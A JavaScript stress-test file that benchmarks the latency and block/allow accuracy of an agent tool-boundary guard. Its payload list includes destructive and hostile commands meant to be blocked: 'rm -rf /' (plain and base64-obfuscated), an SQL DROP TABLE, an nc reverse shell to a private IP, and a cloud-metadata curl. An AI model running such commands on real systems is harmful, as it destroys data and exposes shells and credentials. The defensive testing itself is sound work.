/**
 * Bartholomew BTP v6.5.6 — High-Concurrency Latency & Throughput Stress Test
 * Path: tests/benchmark_concurrency_stress.js
 * 
 * Verifies sub-35µs SLA under concurrent multi-agent simulated load (2,000 requests).
 */

import { enforceToolBoundary } from '../packages/npm_package/agent_core.js';
import fs from 'fs';

async function runBenchmark() {
  console.log('='.repeat(75));
  console.log('BARTHOLOMEW BTP v6.5.6 — HIGH-CONCURRENCY STRESS TEST (2,000 ITERATIONS)');
  console.log('='.repeat(75));

  const totalIterations = 2000;
  const concurrencyLevel = 50; // 50 concurrent in-flight evaluations
  const warmupCycles = 200;

  const testPayloads = [
    { tool: 'bash', input: { command: 'rm -rf /' }, expectBlock: true },
    { tool: 'bash', input: { command: 'echo "cm0gLXJmIC8=" | base64 -d | sh' }, expectBlock: true },
    { tool: 'sql', input: { query: 'DROP TABLE users; --' }, expectBlock: true },
    { tool: 'bash', input: { command: 'nc -e /bin/sh 10.0.0.1 4242' }, expectBlock: true },
    { tool: 'bash', input: { command: 'curl -s http://169.254.169.254/latest/meta-data/' }, expectBlock: true },
    { tool: 'bash', input: { command: 'git status' }, expectBlock: false },
    { tool: 'bash', input: { command: 'npm test' }, expectBlock: false },
    { tool: 'file_read', input: { path: 'src/index.js' }, expectBlock: false },
    { tool: 'sql', input: { query: 'SELECT id, username FROM users WHERE tenant_id = 1;' }, expectBlock: false },
    { tool: 'bash', input: { command: 'ls -la ./packages' }, expectBlock: false }
  ];

  // Warmup
  console.log(`Executing ${warmupCycles} warmup iterations...`);
  for (let i = 0; i < warmupCycles; i++) {
    const p = testPayloads[i % testPayloads.length];
    enforceToolBoundary(p.tool, p.input);
  }

  console.log(`Launching ${totalIterations} iterations with concurrency batch size ${concurrencyLevel}...`);
  const timingsNs = [];
  let correctDecisions = 0;

  const wallClockStart = process.hrtime.bigint();

  // Process in concurrent batches
  for (let i = 0; i < totalIterations; i += concurrencyLevel) {
    const batchSize = Math.min(concurrencyLevel, totalIterations - i);
    const batchPromises = [];

    for (let j = 0; j < batchSize; j++) {
      const payload = testPayloads[(i + j) % testPayloads.length];
      batchPromises.push(new Promise((resolve) => {
        const t0 = process.hrtime.bigint();
        const res = enforceToolBoundary(payload.tool, payload.input, {
          agent_id: `agent-worker-${j}`,
          session_id: `session-batch-${i}`
        });
        const t1 = process.hrtime.bigint();
        const elapsedNs = Number(t1 - t0);

        const isBlocked = res.allowed === false || res.verdict === 'DENY';
        if (isBlocked === payload.expectBlock) {
          correctDecisions++;
        }
        resolve(elapsedNs);
      }));
    }

    const batchResults = await Promise.all(batchPromises);
    timingsNs.push(...batchResults);
  }

  const wallClockEnd = process.hrtime.bigint();
  const totalWallClockSec = Number(wallClockEnd - wallClockStart) / 1e9;

  // Compute statistics in microseconds
  timingsNs.sort((a, b) => a - b);
  const toUs = (ns) => Number((ns / 1000).toFixed(2));

  const minUs = toUs(timingsNs[0]);
  const p50Us = toUs(timingsNs[Math.floor(timingsNs.length * 0.50)]);
  const p90Us = toUs(timingsNs[Math.floor(timingsNs.length * 0.90)]);
  const p95Us = toUs(timingsNs[Math.floor(timingsNs.length * 0.95)]);
  const p99Us = toUs(timingsNs[Math.floor(timingsNs.length * 0.99)]);
  const maxUs = toUs(timingsNs[timingsNs.length - 1]);
  const avgUs = toUs(timingsNs.reduce((acc, v) => acc + v, 0) / timingsNs.length);
  const throughputOpsPerSec = Math.round(totalIterations / totalWallClockSec);

  const slaThresholdUs = 35.0;
  const slaSatisfied = p50Us < slaThresholdUs;

  console.log('='.repeat(75));
  console.log('CONCURRENCY STRESS TEST RESULTS');
  console.log('='.repeat(75));
  console.log(`Total Requests Evaluated:   ${totalIterations}`);
  console.log(`Wall-Clock Duration:        ${totalWallClockSec.toFixed(3)}s`);
  console.log(`Throughput:                 ${throughputOpsPerSec.toLocaleString()} ops/second`);
  console.log(`Zero-Trust Accuracy:        ${((correctDecisions / totalIterations) * 100).toFixed(2)}% (${correctDecisions}/${totalIterations})`);
  console.log('-'.repeat(75));
  console.log(`Minimum Latency:            ${minUs} µs`);
  console.log(`Average Latency:            ${avgUs} µs`);
  console.log(`Median (p50) Latency:       ${p50Us} µs   [SLA < ${slaThresholdUs} µs -> ${slaSatisfied ? 'PASS' : 'FAIL'}]`);
  console.log(`90th Percentile (p90):      ${p90Us} µs`);
  console.log(`95th Percentile (p95):      ${p95Us} µs`);
  console.log(`99th Percentile (p99):      ${p99Us} µs`);
  console.log(`Maximum Latency:            ${maxUs} µs`);
  console.log('='.repeat(75));

  const resultManifest = {
    benchmark: "BTP v6.5.6 High-Concurrency Stress Test",
    timestamp_utc: new Date().toISOString(),
    total_iterations: totalIterations,
    concurrency_level: concurrencyLevel,
    wall_clock_seconds: Number(totalWallClockSec.toFixed(3)),
    throughput_ops_per_second: throughputOpsPerSec,
    decision_accuracy_pct: Number(((correctDecisions / totalIterations) * 100).toFixed(2)),
    sla: {
      median_threshold_us: slaThresholdUs,
      p50_us: p50Us,
      sla_satisfied: slaSatisfied
    },
    latency_distribution_us: {
      min: minUs,
      p50: p50Us,
      p90: p90Us,
      p95: p95Us,
      p99: p99Us,
      max: maxUs,
      average: avgUs
    }
  };

  fs.writeFileSync('docs/audit/concurrency-stress-results.json', JSON.stringify(resultManifest, null, 2));
  console.log('Wrote results to docs/audit/concurrency-stress-results.json');
}

runBenchmark().catch(err => {
  console.error('Benchmark failed:', err);
  process.exit(1);
});
